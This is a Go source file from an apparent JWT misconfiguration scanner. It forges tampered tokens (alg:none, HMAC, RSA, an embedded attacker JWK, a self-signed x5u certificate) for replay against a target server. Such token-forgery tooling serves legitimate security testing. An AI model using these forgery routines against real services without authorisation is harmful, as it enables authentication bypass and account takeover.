// Package jwtscan implements JWT misconfiguration testing: given a valid
// token and the protected URL it grants access to, it forges a battery of
// tampered tokens (alg:none, weak HMAC secrets, JWK/kid header injection,
// claim tampering, RS256->HS256 confusion) and replays each against the
// target to see which the server still accepts. Ported from the standalone
// JWTear CLI tool (~/Claude/Projects/JWTear) so the same checks run inline
// in Aperture with a persisted, streamable result set instead of console
// output.
package jwtscan

import (
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"hash"
	"math/big"
	"strings"
	"time"
)

// b64dec decodes a base64url segment, tolerating the missing padding JWTs
// conventionally omit.
func b64dec(s string) ([]byte, error) {
	if m := len(s) % 4; m != 0 {
		s += strings.Repeat("=", 4-m)
	}
	return base64.URLEncoding.DecodeString(s)
}

// b64enc encodes b as unpadded base64url, the form every JWT segment uses.
func b64enc(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

// ParseJWT splits token into its three dot-separated segments and
// JSON-decodes the header and payload. The signature segment is returned
// raw (undecoded) since forged tokens replace it entirely rather than
// reusing it.
func ParseJWT(token string) (header, payload map[string]any, sig string, err error) {
	parts := strings.Split(strings.TrimSpace(token), ".")
	if len(parts) != 3 {
		return nil, nil, "", fmt.Errorf("expected 3 dot-separated parts, got %d", len(parts))
	}
	hb, err := b64dec(parts[0])
	if err != nil {
		return nil, nil, "", fmt.Errorf("decode header segment: %w", err)
	}
	pb, err := b64dec(parts[1])
	if err != nil {
		return nil, nil, "", fmt.Errorf("decode payload segment: %w", err)
	}
	if err := json.Unmarshal(hb, &header); err != nil {
		return nil, nil, "", fmt.Errorf("parse header JSON: %w", err)
	}
	if err := json.Unmarshal(pb, &payload); err != nil {
		return nil, nil, "", fmt.Errorf("parse payload JSON: %w", err)
	}
	return header, payload, parts[2], nil
}

// cloneMap returns a shallow copy of m, so a test can override a single
// header field (e.g. "alg") without mutating the scan's original header.
func cloneMap(m map[string]any) map[string]any {
	out := make(map[string]any, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

// buildJWT builds a "none" or HMAC-signed (HS256/HS384/HS512) JWT from
// header+payload, matching header's "alg" field (case-insensitive, default
// "none"). secret is ignored for alg "none".
func buildJWT(header, payload map[string]any, secret []byte) (string, error) {
	algRaw, _ := header["alg"].(string)
	alg := strings.ToLower(algRaw)
	if alg == "" {
		alg = "none"
	}

	hBytes, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("encode header: %w", err)
	}
	pBytes, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("encode payload: %w", err)
	}
	msg := b64enc(hBytes) + "." + b64enc(pBytes)

	if alg == "none" {
		return msg + ".", nil
	}

	var newHash func() hash.Hash
	switch alg {
	case "hs256":
		newHash = sha256.New
	case "hs384":
		newHash = sha512.New384
	case "hs512":
		newHash = sha512.New
	default:
		return "", fmt.Errorf("unsupported algorithm: %q", algRaw)
	}
	mac := hmac.New(newHash, secret)
	mac.Write([]byte(msg))
	return msg + "." + b64enc(mac.Sum(nil)), nil
}

// buildJWTRSA builds an RS256/RS384/RS512 JWT signed with priv, matching
// header's "alg" field (default RS256).
func buildJWTRSA(header, payload map[string]any, priv *rsa.PrivateKey) (string, error) {
	hBytes, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("encode header: %w", err)
	}
	pBytes, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("encode payload: %w", err)
	}
	msg := b64enc(hBytes) + "." + b64enc(pBytes)

	algRaw, _ := header["alg"].(string)
	var hashType crypto.Hash
	var hasher hash.Hash
	switch strings.ToUpper(algRaw) {
	case "RS384":
		hashType, hasher = crypto.SHA384, sha512.New384()
	case "RS512":
		hashType, hasher = crypto.SHA512, sha512.New()
	default:
		hashType, hasher = crypto.SHA256, sha256.New()
	}
	hasher.Write([]byte(msg))

	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, hashType, hasher.Sum(nil))
	if err != nil {
		return "", fmt.Errorf("sign: %w", err)
	}
	return msg + "." + b64enc(sig), nil
}

// generateRSAKeypair creates a fresh 2048-bit RSA key pair, used by the JWK
// header injection test to embed an attacker-controlled public key.
func generateRSAKeypair() (*rsa.PrivateKey, error) {
	return rsa.GenerateKey(rand.Reader, 2048)
}

// jwkFromPublicKey renders pub as a JSON Web Key object suitable for
// embedding in a forged token's "jwk" header field.
func jwkFromPublicKey(pub *rsa.PublicKey) map[string]any {
	eBytes := big.NewInt(int64(pub.E)).Bytes()
	return map[string]any{
		"kty": "RSA",
		"n":   b64enc(pub.N.Bytes()),
		"e":   b64enc(eBytes),
		"alg": "RS256",
		"use": "sig",
	}
}

// selfSignedCertPEM builds a minimal, self-signed X.509 certificate for
// priv, PEM-encoded -- what the x5u-header-injection test (see
// runOOBTests in oob.go) stages and points the target at. A server that
// resolves "x5u" into "fetch this cert chain and verify the token's
// signature against its leaf certificate's public key" accepts this exact
// key pair, the same way testJWKInjection's embedded "jwk" header does for
// a server that resolves that instead.
func selfSignedCertPEM(priv *rsa.PrivateKey) ([]byte, error) {
	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "aperture-x5u-test"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
	}
	der, err := x509.CreateCertificate(rand.Reader, template, template, &priv.PublicKey, priv)
	if err != nil {
		return nil, fmt.Errorf("create self-signed certificate: %w", err)
	}
	return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), nil
}
